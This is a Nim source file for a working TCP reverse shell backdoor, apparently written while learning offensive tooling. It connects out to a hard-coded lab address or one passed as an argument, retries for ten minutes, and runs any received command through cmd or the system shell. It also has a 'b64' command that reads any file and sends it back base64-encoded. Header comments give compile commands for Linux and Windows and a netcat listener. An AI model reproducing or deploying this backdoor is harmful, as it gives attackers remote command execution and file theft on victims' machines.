import net
import osproc # this comes with execProcess, which returns the output of the command as a string
import os
import strutils
import base64

#[
    Compile for Linux
    nim c -r tcpReverseShell.nim
    
    Optimized for Size - Decreases size by about 40%
    nim c -d:strip --opt:size -r tcpReverseShell.nim

    Compile for Windows
    nim c -d:mingw -d:strip --opt:size tcpReverseShell.nim

    Establish listener on receiving host
    nc -lvp 8090

    References:
        https://trustfoundry.net/writing-basic-offensive-tooling-in-nim/

]#

proc displaymenu(): string =
    var info: string = ""
    info = "b64 <file with full path> - base64 file\n"
    info &= "exit - Leave the backdoor\n\n"
    result = info

proc checkOS(): string =
    if (system.hostOS == "linux"):
        result = "Linux"
    else:
        result = "Windows"

var ip = "10.10.14.17"
var port = 8095
var retrycount = 0
var retryinterval = 60 # Stop retrying after 60 * 10 seconds or 10 minutes...
var errorcount = 0
var errorreset = 50 
var args = commandLineParams() # returns a sequence (similar to a Python list) of the CLI arguments

if args.len() == 2:
    ip = args[0]
    port = parseInt(args[1])

# begin by creating a new socket
var socket = newSocket()
#echo "Attempting to connect to ", ip, " on port ", port, "..."

while retrycount < retryinterval:
    try:
        socket.connect(ip, Port(port))
        while true:
            try:
                var osType: string = ""
                if (osType == ""):
                    osType = checkOS()
                socket.send("> ")
                var command = socket.recvLine() 
                var result: string = ""
                if (command == "help"):
                    result = displaymenu()
                elif ("b64" in command):
                    var filePath: string = command[4 .. ^1]
                    let fileContent = readFile(filePath)
                    result = encode(fileContent) & "\n\n"
                elif (command == "exit"):
                    socket.close()
                    system.quit(0)
                # Do nothing with blank commands and line returns...
                elif (command == "" or command == "\r\n" or command == "\n"):
                    result = "\n"
                else:
                    if osType == "Windows":
                        result = execProcess("cmd /c " & command) 
                    else:
                        result = execProcess(command)
                        #result = execProcess(command) 
                socket.send(result)   
            except:
                # Do not exit and respond with an error if try is not met...
                socket.send("error")
                if errorcount < errorreset:
                    errorcount += 1
                else:
                    socket.close()
                    system.quit(0)

    # If connection fails, wait 10 seconds and try again up to the retry interval        
    except:
        # Wait 10 seconds for the listening port to become available
        sleep(10000)
        retrycount += 1 
        continue

socket.close()
system.quit(0)
